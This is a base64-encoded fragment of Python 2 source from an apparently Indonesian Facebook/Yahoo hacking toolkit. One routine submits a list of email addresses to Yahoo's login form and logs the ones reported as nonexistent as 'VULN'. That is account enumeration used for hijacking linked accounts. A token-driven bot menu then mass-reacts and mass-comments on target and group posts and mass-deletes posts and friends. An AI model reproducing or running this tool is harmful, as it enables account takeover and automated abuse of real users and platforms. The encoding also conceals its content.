HRva2V0CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIHRyeToKICAgIG9zLm1rZGlyKCdvdXQnKQogIGV4Y2VwdCBPU0Vycm9yOgogICAgcGFzcwogIG9zLnN5c3RlbSgncmVzZXQnKQogIHByaW50IGxvZ28KICBmaWxlcyA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBwYXRoIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQogIHRyeToKICAgIHRvdGFsID0gb3BlbihmaWxlcywiciIpCiAgICBtYWlsID0gdG90YWwucmVhZGxpbmVzKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gRmlsZSBub3QgZm91bmQiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbWVudV95YWhvbygpCiAgbXBzaCA9IFtdCiAgam1sID0gMAogIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQogIHNhdmUgPSBvcGVuKCdvdXQvRmlsZU1haWxWdWxuLnR4dCcsJ3cnKQogIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogIG1haWwgPSBvcGVuKGZpbGVzLCJyIikucmVhZGxpbmVzKCkKICBmb3IgcHcgaW4gbWFpbDoKICAgIG1haWwgPSBwdy5yZXBsYWNlKCJcbiIsIiIpCiAgICBqbWwgKz0xCiAgICBtcHNoLmFwcGVuZChqbWwpCiAgICB5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQogICAgb3R3ID0geWFob28uc2VhcmNoKG1haWwpLmdyb3VwKCkKICAgIGlmICd5YWhvby5jb20nIGluIG90dzoKICAgICAgYnIub3BlbigiaHR0cHM6Ly9sb2dpbi55YWhvby5jb20vY29uZmlnL2xvZ2luPy5zcmM9ZnBjdHgmLmludGw9aWQmLmxhbmc9aWQtSUQmLmRvbmU9aHR0cHM6Ly9pZC55YWhvby5jb20iKQogICAgICBici5fZmFjdG9yeS5pc19odG1sID0gVHJ1ZQogICAgICBici5zZWxlY3RfZm9ybShucj0wKQogICAgICBiclsidXNlcm5hbWUiXSA9IG1haWwKICAgICAga2xpayA9IGJyLnN1Ym1pdCgpLnJlYWQoKQogICAgICBqb2sgPSByZS5jb21waWxlKHInIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPi4qJykKICAgICAgdHJ5OgogICAgICAgIHBlayA9IGpvay5zZWFyY2goa2xpaykuZ3JvdXAoKQogICAgICBleGNlcHQ6CiAgICAgICAgY29udGludWUKICAgICAgaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBlazoKICAgICAgICBzYXZlLndyaXRlKG1haWwgKyAnXG4nKQogICAgICAgIHByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtVlVMTuKck1wwMzNbMTs5N20gXSBcMDMzWzE7OTJtIiArbWFpbCkKICAgICAgICBiZXJoYXNpbC5hcHBlbmQobWFpbCkKICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICBwcmludCAnXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybURvbmUgXDAzM1sxOzk3bS4uLi4nCiAgcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihiZXJoYXNpbCkpCiAgcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gb3V0L0ZpbGVNYWlsVnVsbi50eHQiCiAgc2F2ZS5jbG9zZSgpCiAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICBtZW51X3lhaG9vKCkKICAKCiAgICAKIyMjIyMgTUVOVSBCT1QgIyMjIyMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0jCmRlZiBtZW51X2JvdCgpOgogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICBwcmludCBsb2dvCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLlwwMzNbMTs5N20gQm90IFJlYWN0aW9ucyBUYXJnZXQgUG9zdCIKICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBCb3QgUmVhY3Rpb25zIEdydXAgUG9zdCIKICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTMuXDAzM1sxOzk3bSBCb3QgS29tZW4gVGFyZ2V0IFBvc3QiCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LlwwMzNbMTs5N20gQm90IEtvbWVuIEdydXAgUG9zdCIKICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuXDAzM1sxOzk3bSBNYXNzIGRlbGV0ZSBQb3N0IgogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi5cMDMzWzE7OTdtIE1hc3MgYWNjZXB0IGZyaWVuZCIKICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTcuXDAzM1sxOzk3bSBNYXNzIGRlbGV0ZSBmcmllbmQiCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKICBwcmludCAi4pWRIgogIGJvdF9waWxpaCgpCiMvLy8vLy8vLy8vLy8KZGVmIGJvdF9waWxpaCgpOgogIGJvdHMgPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikKICBpZiBib3RzID09IiI6CiAgICBwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKICAgIGJvdF9waWxpaCgpCiAgZWxpZiBib3RzID09IjEiOgogICAgbWVudV9yZWFjdCgpCiAgZWxpZiBib3RzID09IjIiOgogICAgZ3J1cF9yZWFjdCgpCiAgZWxpZiBib3RzID09IjMiOgogICAgYm90X2tvbWVuKCkKICBlbGlmIGJvdHMgPT0iNCI6CiAgICBncnVwX2tvbWVuKCkKICBlbGlmIGJvdHMgPT0iNSI6CiAgICBkZWxldGVwb3N0KCkKICBlbGlmIGJvdHMgPT0iNiI6CiAgICBhY2NlcHQoKQogIGVsaWYgYm90cyA9PSI3IjoKICAgIHVuZnJpZW5kKCkKICBlbGlmIGJvdHMgPT0iMCI6CiAgICBtZW51KCkKICBlbHNlOgogICAgcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCiAgICBib3RfcGlsaWgoKQogICAgCiMjIyMjIE1FTlUgUkVBQ1QgIyMjIyMKZGVmIG1lbnVfcmVhY3QoKToKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIHByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuIFwwMzNbMTs5N21MaWtlIikKICBwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLiBcMDMzWzE7OTdtTG92ZSIpCiAgcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy4gXDAzM1sxOzk3bVdvdyIpCiAgcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC4gXDAzM1sxOzk3bUhhaGEiKQogIHByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuIFwwMzNbMTs5N21TYWRCb3kiKQogIHByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTYuIFwwMzNbMTs5N21BbmdyeSIpCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKICBwcmludCAi4pWRIgogIHJlYWN0X3BpbGloKCkKIy8vLy8vLy8vLy8vLy8vCmRlZiByZWFjdF9waWxpaCgpOgogIGdsb2JhbCB0aXBlCiAgYWtzaSA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQogIGlmIGFrc2kgPT0iIjoKICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgogICAgcmVhY3RfcGlsaWgoKQogIGVsaWYgYWtzaSA9PSIxIjoKICAgIHRpcGUgPSAiTElLRSIKICAgIHJlYWN0KCkKICBlbGlmIGFrc2kgPT0iMiI6CiAgICB0aXBlID0gIkxPVkUiCiAgICByZWFjdCgpCiAgZWxpZiBha3NpID09IjMiOgogICAgdGlwZSA9ICJXT1ciCiAgICByZWFjdCgpCiAgZWxpZiBha3NpID09IjQiOgogICAgdGlwZSA9ICJIQUhBIgogICAgcmVhY3QoKQogIGVsaWYgYWtzaSA9PSI1IjoKICAgIHRpcGUgPSAiU0FEIgogICAgcmVhY3QoKQogIGVsaWYgYWtzaSA9PSI2IjoKICAgIHRpcGUgPSAiQU5HUlkiCiAgICByZWFjdCgpCiAgZWxpZiBha3NpID09IjAiOgogICAgbWVudV9ib3QoKQogIGVsc2U6CiAgICBwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKICAgIHJlYWN0X3BpbGloKCkKIyMjIyNORVhUCmRlZiByZWFjdCgpOgogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICBwcmludCBsb2dvCiAgaWRlID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBUYXJnZXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCiAgbGltaXQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkybUxpbWl0IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiKQogIHRyeToKICAgIG9oID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkZSsiP2ZpZWxkcz1mZWVkLmxpbWl0KCIrbGltaXQrIikmYWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICBhaCA9IGpzb24ubG9hZHMob2gudGV4dCkKICAgIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBmb3IgYSBpbiBhaFsnZmVlZCddWydkYXRhJ106CiAgICAgIHkgPSBhWydpZCddCiAgICAgIHJlYWtzaS5hcHBlbmQoeSkKICAgICAgcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit5KyIvcmVhY3Rpb25zP3R5cGU9Iit0aXBlKyImYWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICAgIHByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK3lbOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uIFwwMzNbMTs5Mm1dIFwwMzNbMTs5N20nK3RpcGUKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgcHJpbnQgIlxyXDAzM1sxOzkxbVsrXVwwMzNbMTs5Mm0gRG9uZSBcMDMzWzE7OTdtIitzdHIobGVuKHJlYWtzaSkpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbWVudV9ib3QoKQogIGV4Y2VwdCBLZXlFcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gSUQgbm90IGZvdW5kIgogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIG1lbnVfYm90KCkKICAgIAojIyMjIyBCT1QgUkVBQ1QgR1JVUCAjIyMjIwpkZWYgZ3J1cF9yZWFjdCgpOgogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICBwcmludCBsb2dvCiAgcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS4gXDAzM1sxOzk3bUxpa2UiKQogIHByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuIFwwMzNbMTs5N21Mb3ZlIikKICBwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLiBcMDMzWzE7OTdtV293IikKICBwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LiBcMDMzWzE7OTdtSGFoYSIpCiAgcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNS4gXDAzM1sxOzk3bVNhZEJveSIpCiAgcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi4gXDAzM1sxOzk3bUFuZ3J5IikKICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBCYWNrIgogIHByaW50ICLilZEiCiAgcmVhY3RnX3BpbGloKCkKIy8vLy8vLy8vLy8vLy8vCmRlZiByZWFjdGdfcGlsaWgoKToKICBnbG9iYWwgdGlwZQogIGFrc2kgPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikKICBpZiBha3NpID09IiI6CiAgICBwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKICAgIHJlYWN0Z19waWxpaCgpCiAgZWxpZiBha3NpID09IjEiOgogICAgdGlwZSA9ICJMSUtFIgogICAgcmVhY3RnKCkKICBlbGlmIGFrc2kgPT0iMiI6CiAgICB0aXBlID0gIkxPVkUiCiAgICByZWFjdGcoKQogIGVsaWYgYWtzaSA9PSIzIjoKICAgIHRpcGUgPSAiV09XIgogICAgcmVhY3RnKCkKICBlbGlmIGFrc2kgPT0iNCI6CiAgICB0aXBlID0gIkhBSEEiCiAgICByZWFjdGcoKQogIGVsaWYgYWtzaSA9PSI1IjoKICAgIHRpcGUgPSAiU0FEIgogICAgcmVhY3RnKCkKICBlbGlmIGFrc2kgPT0iNiI6CiAgICB0aXBlID0gIkFOR1JZIgogICAgcmVhY3RnKCkKICBlbGlmIGFrc2kgPT0iMCI6CiAgICBtZW51X2JvdCgpCiAgZWxzZToKICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgogICAgcmVhY3RnX3BpbGloKCkKIyMjIyNORVhUCmRlZiByZWFjdGcoKToKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIGlkZSA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgR3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCiAgbGltaXQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkybUxpbWl0IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiKQogIHRyeToKICAgIHI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZGUrJyZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKICAgIGFzdz1qc29uLmxvYWRzKHIudGV4dCkKICAgIHByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCiAgZXhjZXB0IEtleUVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZ3J1cF9yZWFjdCgpCiAgdHJ5OgogICAgb2ggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YzLjAvIitpZGUrIj9maWVsZHM9ZmVlZC5saW1pdCgiK2xpbWl0KyIpJmFjY2Vzc190b2tlbj0iK3Rva2V0KQogICAgYWggPSBqc29uLmxvYWRzKG9oLnRleHQpCiAgICBqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgZm9yIGEgaW4gYWhbJ2ZlZWQnXVsnZGF0YSddOgogICAgICB5ID0gYVsnaWQnXQogICAgICByZWFrc2lncnVwLmFwcGVuZCh5KQogICAgICByZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3krIi9yZWFjdGlvbnM/dHlwZT0iK3RpcGUrIiZhY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgICAgcHJpbnQgJ1wwMzNbMTs5Mm1bXDAzM1sxOzk3bScreVs6MTBdLnJlcGxhY2UoJ1xuJywnICcpKycuLi4gXDAzM1sxOzkybV0gXDAzM1sxOzk3bScrdGlwZQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBwcmludCAiXHJcMDMzWzE7OTFtWytdXDAzM1sxOzkybSBEb25lIFwwMzNbMTs5N20iK3N0cihsZW4ocmVha3NpZ3J1cCkpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbWVudV9ib3QoKQogIGV4Y2VwdCBLZXlFcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gSUQgbm90IGZvdW5kIgogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIG1lbnVfYm90KCkKICAKIyMjIyMgQk9UIEtPTUVOICMjIyMjCmRlZiBib3Rfa29tZW4oKToKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIHByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1Vc2UgXDAzM1sxOzk3bSc8PicgXDAzM1sxOzkybWZvciBuZXcgbGluZXMiCiAgaWRlID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JRCBUYXJnZXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCiAga20gPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUNvbW1lbnQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCiAgbGltaXQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkybUxpbWl0IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiKQogIGttPWttLnJlcGxhY2UoJzw+JywnXG4nKQogIHRyeToKICAgIHAgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWRlKyI/ZmllbGRzPWZlZWQubGltaXQoIitsaW1pdCsiKSZhY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgIGEgPSBqc29uLmxvYWRzKHAudGV4dCkKICAgIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBmb3IgcyBpbiBhWydmZWVkJ11bJ2RhdGEnXToKICAgICAgZiA9IHNbJ2lkJ10KICAgICAga29tZW4uYXBwZW5kKGYpCiAgICAgIHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrZisiL2NvbW1lbnRzP21lc3NhZ2U9IitrbSsiJmFjY2Vzc190b2tlbj0iK3Rva2V0KQogICAgICBwcmludCAnXDAzM1sxOzkybVtcMDMzWzE7OTdtJytrbVs6MTBdLnJlcGxhY2UoJ1xuJywnICcpKycuLi4gXDAzM1sxOzkybV0nCiAgICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICAgIHByaW50ICJcclwwMzNbMTs5MW1bK11cMDMzWzE7OTJtIERvbmUgXDAzM1sxOzk3bSIrc3RyKGxlbihrb21lbikpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbWVudV9ib3QoKQogIGV4Y2VwdCBLZXlFcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gSUQgbm90IGZvdW5kIgogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIG1lbnVfYm90KCkKCiMjIyMjIEJPVCBLT01FTiBHUlVQICMjIyMjCmRlZiBncnVwX2tvbWVuKCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIG9zLnN5c3RlbSgncmVzZXQnKQogIHByaW50IGxvZ28KICBwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtVXNlIFwwMzNbMTs5N20nPD4nIFwwMzNbMTs5Mm1mb3IgbmV3IGxpbmVzIgogIGlkZSA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSUQgR3JvdXAgIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQogIGttID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Db21tZW50IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQogIGxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKICBrbT1rbS5yZXBsYWNlKCc8PicsJ1xuJykKICB0cnk6CiAgICByPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWRlKycmYWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgICBhc3c9anNvbi5sb2FkcyhyLnRleHQpCiAgICBwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQogIGV4Y2VwdCBLZXlFcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIG1lbnVfYm90KCkKICB0cnk6CiAgICBwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92My4wLyIraWRlKyI/ZmllbGRzPWZlZWQubGltaXQoIitsaW1pdCsiKSZhY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgIGEgPSBqc29uLmxvYWRzKHAudGV4dCkKICAgIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBmb3IgcyBpbiBhWydmZWVkJ11bJ2RhdGEnXToKICAgICAgZiA9IHNbJ2lkJ10KICAgICAga29tZW5ncnVwLmFwcGVuZChmKQogICAgICByZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2YrIi9jb21tZW50cz9tZXNzYWdlPSIra20rIiZhY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgICAgcHJpbnQgJ1wwMzNbMTs5Mm1bXDAzM1sxOzk3bScra21bOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uIFwwMzNbMTs5Mm1dJwogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBwcmludCAiXHJcMDMzWzE7OTFtWytdXDAzM1sxOzkybSBEb25lIFwwMzNbMTs5N20iK3N0cihsZW4oa29tZW5ncnVwKSkKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBtZW51X2JvdCgpCiAgZXhjZXB0IEtleUVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciIKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBtZW51X2JvdCgpCiAgICAKIyMjIyMgSEFQVVMgUE9TVCAjIyMjIwpkZWYgZGVsZXRlcG9zdCgpOgogIG9zL